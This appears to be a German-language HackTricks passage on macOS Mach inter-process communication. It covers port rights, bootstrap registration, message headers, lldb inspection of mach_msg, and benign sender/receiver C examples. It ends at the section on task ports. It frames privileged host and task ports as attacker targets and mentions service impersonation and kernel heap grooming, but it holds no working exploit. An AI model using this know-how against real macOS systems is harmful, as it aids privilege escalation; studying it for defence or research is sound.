# macOS IPC - Inter Process Communication

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** oder **HackTricks als PDF herunterladen** möchten, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandising**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Mach-Nachrichten über Ports

### Grundlegende Informationen

Mach verwendet **Tasks** als die **kleinste Einheit** zum Teilen von Ressourcen, und jeder Task kann **mehrere Threads** enthalten. Diese **Tasks und Threads sind 1:1 auf POSIX-Prozesse und Threads abgebildet**.

Die Kommunikation zwischen Tasks erfolgt über die Mach Inter-Process Communication (IPC), wobei einseitige Kommunikationskanäle genutzt werden. **Nachrichten werden zwischen Ports übertragen**, die eine Art von **Nachrichtenwarteschlangen** darstellen, die vom Kernel verwaltet werden.

Ein **Port** ist das **Grundelement** der Mach-IPC. Es kann verwendet werden, um **Nachrichten zu senden und zu empfangen**.

Jeder Prozess hat eine **IPC-Tabelle**, in der es möglich ist, die **Mach-Ports des Prozesses** zu finden. Der Name eines Mach-Ports ist tatsächlich eine Nummer (ein Zeiger auf das Kernelobjekt).

Ein Prozess kann auch einen Portnamen mit bestimmten Rechten **an einen anderen Task senden**, und der Kernel wird diesen Eintrag in der **IPC-Tabelle des anderen Tasks** erscheinen lassen.

### Portrechte

Portrechte, die definieren, welche Operationen ein Task ausführen kann, sind entscheidend für diese Kommunikation. Die möglichen **Portrechte** sind ([Definitionen von hier](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Empfangsrecht**, das das Empfangen von an den Port gesendeten Nachrichten ermöglicht. Mach-Ports sind MPSC (multiple-producer, single-consumer) Warteschlangen, was bedeutet, dass es im gesamten System möglicherweise nur **ein Empfangsrecht für jeden Port** gibt (im Gegensatz zu Pipes, bei denen mehrere Prozesse alle Dateideskriptoren zum Lesenende einer Pipe halten können).
* Ein **Task mit dem Empfangsrecht** kann Nachrichten empfangen und **Senderechte erstellen**, die es ihm ermöglichen, Nachrichten zu senden. Ursprünglich hatte nur der **eigene Task das Empfangsrecht über seinen Port**.
* Wenn der Besitzer des Empfangsrechts **stirbt** oder es beendet, wird das **Senderecht nutzlos (toter Name)**.
* **Senderecht**, das das Senden von Nachrichten an den Port ermöglicht.
* Das Senderecht kann **geklont** werden, sodass ein Task, der ein Senderecht besitzt, das Recht klonen und es einem dritten Task **gewähren kann**.
* Beachten Sie, dass **Portrechte** auch **durch Mac-Nachrichten übergeben** werden können.
* **Einmal-Senderecht**, das das Senden einer Nachricht an den Port ermöglicht und dann verschwindet.
* Dieses Recht **kann nicht geklont** werden, aber es kann **verschoben** werden.
* **Portset-Recht**, das ein _Portset_ anstelle eines einzelnen Ports kennzeichnet. Das Dequeuing einer Nachricht aus einem Portset dequeues eine Nachricht von einem der enthaltenen Ports. Portsets können verwendet werden, um gleichzeitig auf mehreren Ports zu lauschen, ähnlich wie `select`/`poll`/`epoll`/`kqueue` in Unix.
* **Toter Name**, der kein tatsächliches Portrecht ist, sondern nur ein Platzhalter. Wenn ein Port zerstört wird, werden alle bestehenden Portrechte für den Port zu toten Namen.

**Tasks können SEND-Rechte an andere übertragen**, sodass sie Nachrichten zurückschicken können. **SEND-Rechte können auch geklont werden, sodass ein Task das Recht duplizieren und einem dritten Task geben kann**. Dies ermöglicht in Verbindung mit einem Zwischenprozess, der als **Bootstrap-Server** bekannt ist, eine effektive Kommunikation zwischen Tasks.

### Datei-Ports

Datei-Ports ermöglichen es, Dateideskriptoren in Mac-Ports zu kapseln (unter Verwendung von Mach-Portrechten). Es ist möglich, einen `fileport` aus einem gegebenen FD mit `fileport_makeport` zu erstellen und einen FD aus einem `fileport` mit `fileport_makefd` zu erstellen.

### Aufbau einer Kommunikation

Wie bereits erwähnt, ist es möglich, Rechte über Mach-Nachrichten zu senden, jedoch **kann man kein Recht senden, ohne bereits ein Recht** zum Senden einer Mach-Nachricht zu haben. Wie wird also die erste Kommunikation hergestellt?

Dafür ist der **Bootstrap-Server** (**launchd** auf dem Mac) beteiligt, da **jeder ein SEND-Recht zum Bootstrap-Server erhalten kann**, ist es möglich, ihn um ein Recht zu bitten, eine Nachricht an einen anderen Prozess zu senden:

1. Task **A** erstellt einen **neuen Port** und erhält das **Empfangsrecht** darüber.
2. Task **A**, als Inhaber des Empfangsrechts, **erzeugt ein SEND-Recht für den Port**.
3. Task **A** stellt eine **Verbindung** mit dem **Bootstrap-Server** her und **sendet ihm das SEND-Recht** für den Port, das es zu Beginn generiert hat.
* Denken Sie daran, dass jeder ein SEND-Recht zum Bootstrap-Server erhalten kann.
4. Task A sendet eine `bootstrap_register`-Nachricht an den Bootstrap-Server, um den gegebenen Port mit einem Namen wie `com.apple.taska` zu **verknüpfen**.
5. Task **B** interagiert mit dem **Bootstrap-Server**, um eine Bootstrap-**Suche nach dem Dienstnamen** (`bootstrap_lookup`) auszuführen. Damit der Bootstrap-Server antworten kann, sendet Task B ihm ein **SEND-Recht zu einem zuvor erstellten Port** innerhalb der Suchnachricht. Wenn die Suche erfolgreich ist, **dupliziert der Server das SEND-Recht**, das von Task A erhalten wurde, und **überträgt es an Task B**.
* Denken Sie daran, dass jeder ein SEND-Recht zum Bootstrap-Server erhalten kann.
6. Mit diesem SEND-Recht ist **Task B** in der Lage, eine **Nachricht an Task A zu senden**.
7. Für eine bidirektionale Kommunikation erstellt Task **B** normalerweise einen neuen Port mit einem **Empfangsrecht** und einem **SEND-Recht** und gibt das **SEND-Recht an Task A** weiter, damit es Nachrichten an TASK B senden kann (bidirektionale Kommunikation).

Der Bootstrap-Server **kann den** vom Task beanspruchten **Dienstnamen nicht authentifizieren**. Dies bedeutet, dass ein **Task potenziell jeden Systemtask impersonieren** könnte, beispielsweise einen Autorisierungsdienstnamen falsch zu **beanspruchen** und dann jede Anfrage zu genehmigen.

Apple speichert die **Namen der systembereitgestellten Dienste** in sicheren Konfigurationsdateien, die sich in **SIP-geschützten** Verzeichnissen befinden: `/System/Library/LaunchDaemons` und `/System/Library/LaunchAgents`. Neben jedem Dienstnamen wird auch die **zugehörige Binärdatei gespeichert**. Der Bootstrap-Server erstellt und hält ein **Empfangsrecht für jeden dieser Dienstenamen**.

Für diese vordefinierten Dienste **unterscheidet sich der Suchprozess leicht**. Wenn ein Dienstname gesucht wird, startet launchd den Dienst dynamisch. Der neue Ablauf ist wie folgt:

* Task **B** initiiert eine Bootstrap-**Suche** nach einem Dienstnamen.
* **launchd** überprüft, ob der Task ausgeführt wird, und wenn nicht, **startet** er ihn.
* Task **A** (der Dienst) führt ein **Bootstrap-Check-in** (`bootstrap_check_in()`) durch. Hier erstellt der **Bootstrap**-Server ein SEND-Recht, behält es und **überträgt das Empfangsrecht an Task A**.
* launchd dupliziert das **SEND-Recht und sendet es an Task B**.
* Task **B** erstellt einen neuen Port mit einem **Empfangsrecht** und einem **SEND-Recht** und gibt das **SEND-Recht an Task A** (den Dienst) weiter, damit er Nachrichten an TASK B senden kann (bidirektionale Kommunikation).

Dieser Prozess gilt jedoch nur für vordefinierte Systemaufgaben. Nichtsystemaufgaben funktionieren weiterhin wie ursprünglich beschrieben, was potenziell eine Impersonation ermöglichen könnte.

{% hint style="danger" %}
Daher sollte launchd niemals abstürzen, da sonst das gesamte System abstürzt.
{% endhint %}
### Eine Mach-Nachricht

[Hier finden Sie weitere Informationen](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Die `mach_msg`-Funktion, im Wesentlichen ein Systemaufruf, wird zum Senden und Empfangen von Mach-Nachrichten verwendet. Die Funktion erfordert, dass die Nachricht als erstes Argument gesendet wird. Diese Nachricht muss mit einer `mach_msg_header_t`-Struktur beginnen, gefolgt vom eigentlichen Nachrichteninhalt. Die Struktur ist wie folgt definiert:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Prozesse, die ein _**Empfangsrecht**_ besitzen, können Nachrichten über einen Mach-Port empfangen. Umgekehrt erhalten die **Sender** ein _**Senderecht**_ oder ein _**Einmal-Senderecht**_. Das Einmal-Senderecht dient ausschließlich zum Senden einer einzelnen Nachricht, nach der es ungültig wird.

Das anfängliche Feld **`msgh_bits`** ist eine Bitmap:

- Das erste Bit (am signifikantesten) wird verwendet, um anzuzeigen, dass eine Nachricht komplex ist (mehr dazu unten).
- Das 3. und 4. Bit werden vom Kernel verwendet.
- Die **5 am wenigsten signifikanten Bits des 2. Bytes** können für **Gutschein** verwendet werden: ein weiterer Typ von Port zum Senden von Schlüssel/Wert-Kombinationen.
- Die **5 am wenigsten signifikanten Bits des 3. Bytes** können für **lokalen Port** verwendet werden.
- Die **5 am wenigsten signifikanten Bits des 4. Bytes** können für **entfernten Port** verwendet werden.

Die Typen, die im Gutschein, lokalen und entfernten Ports angegeben werden können, sind (aus [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Zum Beispiel kann `MACH_MSG_TYPE_MAKE_SEND_ONCE` verwendet werden, um anzuzeigen, dass ein **Send-once-Recht** abgeleitet und für diesen Port übertragen werden soll. Es kann auch `MACH_PORT_NULL` angegeben werden, um zu verhindern, dass der Empfänger antworten kann.

Um eine einfache **bidirektionale Kommunikation** zu erreichen, kann ein Prozess einen **Mach-Port** im Mach-**Nachrichtenkopf** namens _Antwort-Port_ (**`msgh_local_port`**) angeben, wohin der **Empfänger** der Nachricht eine Antwort auf diese Nachricht senden kann.

{% hint style="success" %}
Beachten Sie, dass diese Art der bidirektionalen Kommunikation in XPC-Nachrichten verwendet wird, die eine Antwort erwarten (`xpc_connection_send_message_with_reply` und `xpc_connection_send_message_with_reply_sync`). Aber **normalerweise werden verschiedene Ports erstellt**, wie zuvor erläutert, um die bidirektionale Kommunikation herzustellen.
{% endhint %}

Die anderen Felder des Nachrichtenkopfs sind:

- `msgh_size`: die Größe des gesamten Pakets.
- `msgh_remote_port`: der Port, auf dem diese Nachricht gesendet wird.
- `msgh_voucher_port`: [Mach-Gutscheine](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: die ID dieser Nachricht, die vom Empfänger interpretiert wird.

{% hint style="danger" %}
Beachten Sie, dass **Mach-Nachrichten über einen `Mach-Port` gesendet werden**, der ein **Kommunikationskanal mit einem einzelnen Empfänger und mehreren Sendern** ist, der in den Mach-Kernel integriert ist. **Mehrere Prozesse** können **Nachrichten an einen Mach-Port senden**, aber zu jedem Zeitpunkt kann nur **ein einziger Prozess daraus lesen**.
{% endhint %}

Nachrichten werden dann durch den **`mach_msg_header_t`**-Kopf gefolgt vom **Körper** und vom **Trailer** (falls vorhanden) gebildet und können die Berechtigung erteilen, darauf zu antworten. In diesen Fällen muss der Kernel die Nachricht einfach von einer Aufgabe an die andere weiterleiten.

Ein **Trailer** ist **eine vom Kernel zur Nachricht hinzugefügte Information** (kann nicht vom Benutzer festgelegt werden), die bei der Nachrichtenempfang mit den Flags `MACH_RCV_TRAILER_<trailer_opt>` angefordert werden kann (es gibt verschiedene Informationen, die angefordert werden können).

#### Komplexe Nachrichten

Es gibt jedoch auch andere **komplexere** Nachrichten, wie diejenigen, die zusätzliche Portrechte übergeben oder Speicher teilen, bei denen der Kernel auch diese Objekte an den Empfänger senden muss. In diesen Fällen wird das höchstwertige Bit des Kopfs `msgh_bits` gesetzt.

Die möglichen Deskriptoren, die übergeben werden können, sind in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) definiert:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32-Bit sind alle Deskriptoren 12B groß und der Deskriptortyp befindet sich im 11. Deskriptor. In 64-Bit variieren die Größen.

{% hint style="danger" %}
Der Kernel kopiert die Deskriptoren von einer Aufgabe zur anderen, erstellt jedoch zuerst eine Kopie im Kernel-Speicher. Diese Technik, bekannt als "Feng Shui", wurde in mehreren Exploits missbraucht, um den Kernel dazu zu bringen, Daten in seinem Speicher zu kopieren, sodass ein Prozess Deskriptoren an sich selbst senden kann. Dann kann der Prozess die Nachrichten empfangen (der Kernel wird sie freigeben).

Es ist auch möglich, Portrechte an einen anfälligen Prozess zu senden, und die Portrechte werden einfach im Prozess erscheinen (auch wenn er sie nicht verarbeitet).
{% endhint %}

### Mac Ports APIs

Beachten Sie, dass Ports dem Aufgaben-Namespace zugeordnet sind. Um einen Port zu erstellen oder nach einem Port zu suchen, wird auch der Aufgaben-Namespace abgefragt (mehr in `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Erstellt** einen Port.
* `mach_port_allocate` kann auch ein **Port-Set** erstellen: Empfangsrecht über eine Gruppe von Ports. Immer wenn eine Nachricht empfangen wird, wird der Port angezeigt, von dem sie stammt.
* `mach_port_allocate_name`: Ändert den Namen des Ports (standardmäßig 32-Bit-Integer)
* `mach_port_names`: Portnamen von einem Ziel abrufen
* `mach_port_type`: Rechte einer Aufgabe über einen Namen abrufen
* `mach_port_rename`: Benennt einen Port um (wie dup2 für FDs)
* `mach_port_allocate`: Einen neuen EMPFANGENEN, PORT_SET oder DEAD_NAME zuweisen
* `mach_port_insert_right`: Erstellt ein neues Recht in einem Port, in dem Sie EMPFANGEN haben
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Funktionen zum **Senden und Empfangen von Mach-Nachrichten**. Die Überschreibversion ermöglicht es, einen anderen Puffer für den Nachrichtenempfang anzugeben (die andere Version wird ihn einfach wiederverwenden).

### Debug mach\_msg

Da die Funktionen **`mach_msg`** und **`mach_msg_overwrite`** diejenigen sind, die zum Senden und Empfangen von Nachrichten verwendet werden, würde das Setzen eines Haltepunkts auf sie ermöglichen, die gesendeten und empfangenen Nachrichten zu inspizieren.

Starten Sie beispielsweise das Debuggen einer beliebigen Anwendung, die Sie debuggen können, da sie `libSystem.B` laden wird, die diese Funktion verwendet.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Haltepunkt 1: wo = libsystem_kernel.dylib`mach_msg, Adresse = 0x00000001803f6c20
<strong>(lldb) r
</strong>Prozess 71019 gestartet: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Prozess 71019 gestoppt
* Thread #1, Warteschlange = 'com.apple.main-thread', Stoppgrund = Haltepunkt 1.1
Rahmen #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Ziel 0: (SandboxedShellApp) gestoppt.
<strong>(lldb) bt
</strong>* Thread #1, Warteschlange = 'com.apple.main-thread', Stoppgrund = Haltepunkt 1.1
* Rahmen #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
Rahmen #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
Rahmen #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
Rahmen #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
Rahmen #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
Rahmen #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
Rahmen #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
Rahmen #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
Rahmen #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
Rahmen #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Um die Argumente von **`mach_msg`** zu erhalten, überprüfen Sie die Register. Dies sind die Argumente (aus [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Hole die Werte aus den Registern:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Überprüfen Sie den Nachrichtenkopf und prüfen Sie das erste Argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Diese Art von `mach_msg_bits_t` ist sehr verbreitet, um eine Antwort zu ermöglichen.



### Ports auflisten
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Der **Name** ist der Standardname, der dem Port zugewiesen wird (überprüfen Sie, wie er in den ersten 3 Bytes **ansteigt**). Das **`ipc-object`** ist der **verschleierte** eindeutige **Bezeichner** des Ports.\
Beachten Sie auch, wie die Ports mit nur **`send`** Rechten den **Besitzer** davon identifizieren (Portname + PID).\
Beachten Sie auch die Verwendung von **`+`** zur Kennzeichnung **anderer Tasks, die mit demselben Port verbunden sind**.

Es ist auch möglich, [**procesxp**](https://www.newosxbook.com/tools/procexp.html) zu verwenden, um auch die **registrierten Dienstnamen** anzuzeigen (bei deaktiviertem SIP aufgrund der Notwendigkeit von `com.apple.system-task-port`):
```
procesp 1 ports
```
Du kannst dieses Tool in iOS installieren, indem du es von [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) herunterlädst.

### Codebeispiel

Beachte, wie der **Sender** einen Port zuweist, ein **Senderecht** für den Namen `org.darlinghq.example` erstellt und es an den **Bootstrap-Server** sendet, während der Sender nach dem **Senderecht** dieses Namens fragte und es verwendete, um eine **Nachricht zu senden**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## Privilegierte Ports

Es gibt einige spezielle Ports, die es ermöglichen, **bestimmte sensible Aktionen auszuführen oder auf bestimmte sensible Daten zuzugreifen**, falls Aufgaben über die **SEND-Berechtigungen** für sie verfügen. Dies macht diese Ports aus der Perspektive eines Angreifers sehr interessant, nicht nur wegen der Fähigkeiten, sondern auch, weil es möglich ist, **SEND-Berechtigungen über Aufgaben hinweg zu teilen**.

### Host-Spezialports

Diese Ports werden durch eine Nummer repräsentiert.

**SEND**-Rechte können durch den Aufruf von **`host_get_special_port`** und **RECEIVE**-Rechte durch den Aufruf von **`host_set_special_port`** erlangt werden. Beide Aufrufe erfordern jedoch den **`host_priv`**-Port, auf den nur der Root zugreifen kann. Darüber hinaus konnte der Root in der Vergangenheit **`host_set_special_port`** aufrufen und willkürlich übernehmen, was es beispielsweise ermöglichte, Code-Signaturen zu umgehen, indem `HOST_KEXTD_PORT` übernommen wurde (SIP verhindert dies jetzt).

Diese sind in 2 Gruppen unterteilt: Die **ersten 7 Ports gehören dem Kernel**, wobei die 1 `HOST_PORT`, die 2 `HOST_PRIV_PORT`, die 3 `HOST_IO_MASTER_PORT` und die 7 `HOST_MAX_SPECIAL_KERNEL_PORT` sind.\
Diejenigen, die mit der Nummer **8** beginnen, sind **Systemdaemons zugeordnet** und können in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html) deklariert gefunden werden.

* **Host-Port**: Wenn ein Prozess **SEND**-Privilegien über diesen Port hat, kann er **Informationen** über das **System** abrufen, indem er seine Routinen aufruft, wie z.B.:
* `host_processor_info`: Prozessorinformationen abrufen
* `host_info`: Hostinformationen abrufen
* `host_virtual_physical_table_info`: Virtuelle/Physische Seitentabelle (erfordert MACH\_VMDEBUG)
* `host_statistics`: Hoststatistiken abrufen
* `mach_memory_info`: Kernel-Speicherlayout abrufen
* **Host-Priv-Port**: Ein Prozess mit **SEND**-Recht über diesen Port kann **privilegierte Aktionen** ausführen, wie das Anzeigen von Bootdaten oder das Versuchen, eine Kernelerweiterung zu laden. Der **Prozess muss Root sein**, um diese Berechtigung zu erhalten.
* Darüber hinaus sind für den Aufruf der **`kext_request`**-API weitere Berechtigungen erforderlich, nämlich **`com.apple.private.kext*`**, die nur Apple-Binärdateien erhalten.
* Weitere Routinen, die aufgerufen werden können, sind:
* `host_get_boot_info`: `machine_boot_info()` abrufen
* `host_priv_statistics`: Privilegierte Statistiken abrufen
* `vm_allocate_cpm`: Kontinuierlichen physischen Speicher zuweisen
* `host_processors`: Senderecht an Hostprozessoren
* `mach_vm_wire`: Speicher resident machen
* Da **Root** auf diese Berechtigung zugreifen kann, könnte er `host_set_[special/exception]_port[s]` aufrufen, um **Host-Spezial- oder Ausnahmeports zu übernehmen**.

Es ist möglich, **alle Host-Spezialports** anzuzeigen, indem man ausführt:
```bash
procexp all ports | grep "HSP"
```
### Aufgaben Ports

Ursprünglich hatte Mach keine "Prozesse", sondern "Tasks", die eher als Container von Threads betrachtet wurden. Als Mach mit BSD fusioniert wurde, wurde jeder Task mit einem BSD-Prozess korreliert. Daher hat jeder BSD-Prozess die erforderlichen Details, um ein Prozess zu sein, und jeder Mach-Task hat ebenfalls seine internen Abläufe (mit Ausnahme der nicht vorhandenen PID 0, die der `kernel_task` ist).

Es gibt zwei sehr interessante Funktionen in Bezug darauf:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Erhalten Sie ein SEND-Recht für den Task-Port des Tasks, der mit der angegebenen `pid` verbunden ist, und übergeben Sie es an den angegebenen `target_task_port` (der normalerweise der Aufrufer-Task ist, der `mach_task_self()` verwendet hat, aber auch ein SEND-Port über einen anderen Task sein könnte).
- `pid_for_task(task, &pid)`: Bei Vorliegen eines SEND-Rechts für einen Task finden Sie heraus, mit welcher PID dieser Task verbunden ist.

